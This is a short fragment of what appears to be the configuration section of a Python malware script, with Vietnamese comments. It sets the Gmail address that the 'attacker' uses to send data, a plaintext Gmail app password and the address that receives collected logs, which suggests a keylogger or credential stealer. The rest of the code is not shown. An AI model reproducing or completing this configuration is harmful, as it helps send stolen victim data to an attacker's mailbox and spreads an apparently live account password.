...
# ===== CẤU HÌNH =====
EMAIL_SEND = "ltthang0987@gmail.com"      # Email attacker dùng để gửi
EMAIL_PASSWORD = "coyn tnyf rgbz jzef"     # Mật khẩu ứng dụng Gmail
EMAIL_RECEIVE = "ltthang0987@gmail.com" # Email nhận log
